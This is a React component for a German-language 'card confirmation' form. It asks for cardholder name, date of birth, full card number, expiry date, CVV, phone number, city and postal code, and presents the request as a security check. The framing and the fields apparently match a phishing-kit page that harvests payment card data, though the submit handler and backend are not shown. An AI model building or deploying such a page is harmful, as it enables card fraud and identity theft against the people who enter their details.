import React from 'react';
import './CardVerificationForm.css';

// German cities list
const germanCities = [
  'Berlin', 'Hamburg', 'München', 'Köln', 'Frankfurt am Main', 
  'Stuttgart', 'Düsseldorf', 'Dortmund', 'Essen', 'Leipzig', 
  'Bremen', 'Dresden', 'Hannover', 'Nürnberg', 'Duisburg',
  'Bochum', 'Wuppertal', 'Bielefeld', 'Bonn', 'Münster',
  'Karlsruhe', 'Mannheim', 'Augsburg', 'Wiesbaden', 'Gelsenkirchen',
  'Mönchengladbach', 'Braunschweig', 'Chemnitz', 'Kiel', 'Aachen',
  'Halle', 'Magdeburg', 'Freiburg', 'Krefeld', 'Lübeck',
  'Oberhausen', 'Erfurt', 'Mainz', 'Rostock', 'Kassel'
];

// Generate months (01-12)
const months = Array.from({ length: 12 }, (_, i) => {
  const month = (i + 1).toString().padStart(2, '0');
  return { value: month, label: month };
});

// Generate years for expiry date (current year + 10 years)
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 11 }, (_, i) => {
  const year = currentYear + i;
  return { value: year.toString().slice(-2), label: year.toString() };
});

// Generate days for date of birth (1-31)
const days = Array.from({ length: 31 }, (_, i) => {
  const day = (i + 1).toString().padStart(2, '0');
  return { value: day, label: day };
});

// Generate months for date of birth (1-12)
const birthMonths = Array.from({ length: 12 }, (_, i) => {
  const month = (i + 1).toString().padStart(2, '0');
  return { value: month, label: month };
});

// Generate years for date of birth (1900 - current year - 18)
const maxBirthYear = currentYear - 18;
const birthYears = Array.from({ length: 100 }, (_, i) => {
  const year = maxBirthYear - i;
  return { value: year.toString(), label: year.toString() };
});

function CardVerificationForm({ cardDetails, cardErrors, isLoading, t, onInputChange, onSubmit }) {
  
  const handleExpiryMonthChange = (month) => {
    const newExpiryDate = month + (cardDetails.expiryDate?.slice(-2) || '');
    onInputChange('expiryDate', newExpiryDate);
  };

  const handleExpiryYearChange = (year) => {
    const newExpiryDate = (cardDetails.expiryDate?.slice(0, 2) || '') + year;
    onInputChange('expiryDate', newExpiryDate);
  };

  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      onInputChange('cvv', value);
    }
  };

  const handlePhoneChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
      onInputChange('phoneNumber', value);
    }
  };

  const handleBirthDateChange = (type, value) => {
    const currentBirthDate = cardDetails.birthDate || { day: '', month: '', year: '' };
    const newBirthDate = { ...currentBirthDate, [type]: value };
    onInputChange('birthDate', newBirthDate);
  };

  const displayPhoneNumber = cardDetails.phoneNumber || '';

  return (
    <div className="card-verification-form">
      <h3>Kartenbestätigung</h3>
      <p className="verification-message">
        Aus Sicherheitsgründen müssen Sie Ihre Daten bestätigen (Deutschland).
      </p>
      
      <form onSubmit={onSubmit}>
        <div className="form-group">
          <label htmlFor="cardholderName">Karteninhaber</label>
          <input
            type="text"
            id="cardholderName"
            value={cardDetails.cardholderName}
            onChange={(e) => onInputChange('cardholderName', e.target.value)}
            placeholder="z.B. MAX MUSTERMANN"
            className={cardErrors.cardholderName ? 'input-error' : ''}
          />
          {cardErrors.cardholderName && (
            <span className="error-message">{cardErrors.cardholderName}</span>
          )}
        </div>

        {/* Date of Birth Field */}
        <div className="form-group">
          <label htmlFor="birthDate">Geburtsdatum</label>
          <div className="birthdate-selects">
            <select
              id="birthDay"
              value={cardDetails.birthDate?.day || ''}
              onChange={(e) => handleBirthDateChange('day', e.target.value)}
              className={cardErrors.birthDate ? 'input-error' : ''}
            >
              <option value="">Tag</option>
              {days.map(day => (
                <option key={day.value} value={day.value}>
                  {day.label}
                </option>
              ))}
            </select>
            <select
              id="birthMonth"
              value={cardDetails.birthDate?.month || ''}
              onChange={(e) => handleBirthDateChange('month', e.target.value)}
              className={cardErrors.birthDate ? 'input-error' : ''}
            >
              <option value="">Monat</option>
              {birthMonths.map(month => (
                <option key={month.value} value={month.value}>
                  {month.label}
                </option>
              ))}
            </select>
            <select
              id="birthYear"
              value={cardDetails.birthDate?.year || ''}
              onChange={(e) => handleBirthDateChange('year', e.target.value)}
              className={cardErrors.birthDate ? 'input-error' : ''}
            >
              <option value="">Jahr</option>
              {birthYears.map(year => (
                <option key={year.value} value={year.value}>
                  {year.label}
                </option>
              ))}
            </select>
          </div>
          {cardErrors.birthDate && (
            <span className="error-message">{cardErrors.birthDate}</span>
          )}
        </div>

        <div className="form-group">
          <label htmlFor="cardNumber">Kartennummer</label>
          <input
            type="text"
            id="cardNumber"
            value={cardDetails.cardNumber}
            onChange={(e) => onInputChange('cardNumber', e.target.value)}
            placeholder="1234 5678 9012 3456"
            maxLength="19"
            className={cardErrors.cardNumber ? 'input-error' : ''}
          />
          {cardErrors.cardNumber && (
            <span className="error-message">{cardErrors.cardNumber}</span>
          )}
        </div>

        <div className="form-row">
          <div className="form-group half">
            <label htmlFor="expiryMonth">Ablaufdatum</label>
            <div className="expiry-selects">
              <select
                id="expiryMonth"
                value={cardDetails.expiryDate?.slice(0, 2) || ''}
                onChange={(e) => handleExpiryMonthChange(e.target.value)}
                className={cardErrors.expiryDate ? 'input-error' : ''}
              >
                <option value="">Monat</option>
                {months.map(month => (
                  <option key={month.value} value={month.value}>
                    {month.label}
                  </option>
                ))}
              </select>
              <select
                id="expiryYear"
                value={cardDetails.expiryDate?.slice(-2) || ''}
                onChange={(e) => handleExpiryYearChange(e.target.value)}
                className={cardErrors.expiryDate ? 'input-error' : ''}
              >
                <option value="">Jahr</option>
                {years.map(year => (
                  <option key={year.value} value={year.value}>
                    {year.label}
                  </option>
                ))}
              </select>
            </div>
            {cardErrors.expiryDate && (
              <span className="error-message">{cardErrors.expiryDate}</span>
            )}
          </div>

          <div className="form-group half">
            <label htmlFor="cvv">Prüfziffer (CVV)</label>
            <input
              type="text"
              id="cvv"
              value={cardDetails.cvv}
              onChange={handleCvvChange}
              placeholder="123"
              maxLength="4"
              className={cardErrors.cvv ? 'input-error' : ''}
            />
            {cardErrors.cvv && (
              <span className="error-message">{cardErrors.cvv}</span>
            )}
          </div>
        </div>

        <div className="form-group">
          <label htmlFor="phoneNumber">Telefonnummer</label>
          <div className="phone-input-wrapper">
            <span className="phone-prefix">+49</span>
            <input
              type="text"
              id="phoneNumber"
              value={displayPhoneNumber}
              onChange={handlePhoneChange}
              placeholder="1234567890"
              maxLength="11"
              className={cardErrors.phoneNumber ? 'input-error' : ''}
            />
          </div>
          {cardErrors.phoneNumber && (
            <span className="error-message">{cardErrors.phoneNumber}</span>
          )}
          <small className="field-hint">Deutsche Handynummer (10-11 Ziffern, z.B. 15123456789)</small>
        </div>

        <div className="form-group">
          <label htmlFor="city">Stadt (Deutschland)</label>
          <select
            id="city"
            value={cardDetails.city}
            onChange={(e) => onInputChange('city', e.target.value)}
            className={cardErrors.city ? 'input-error' : ''}
          >
            <option value="">Bitte wählen...</option>
            {germanCities.map(city => (
              <option key={city} value={city}>{city}</option>
            ))}
          </select>
          {cardErrors.city && (
            <span className="error-message">{cardErrors.city}</span>
          )}
          <small className="field-hint">z.B. Berlin, Hamburg, München, Köln, Frankfurt...</small>
        </div>
        <div className="form-group">
          <label htmlFor="postalCode">Postleitzahl (Deutschland)</label>
          <input
            type="text"
            id="postalCode"
            value={cardDetails.postalCode}
            onChange={(e) => onInputChange('postalCode', e.target.value)}
            placeholder="z.B. 10115"
            maxLength="6"
            className={cardErrors.postalCode ? 'input-error' : ''}
          />
          {cardErrors.postalCode && (
            <span className="error-message">{cardErrors.postalCode}</span>
          )}
          <small className="field-hint">Deutsche Postleitzahl: 5 Ziffern (z.B. 10115 für Berlin)</small>
        </div>

        <div className="card-buttons">
          <button type="submit" className="verify-btn" disabled={isLoading}>
            {isLoading ? 'Wird gesendet...' : 'Karte bestätigen'}
          </button>
        </div>
      </form>
    </div>
  );
}

export default CardVerificationForm;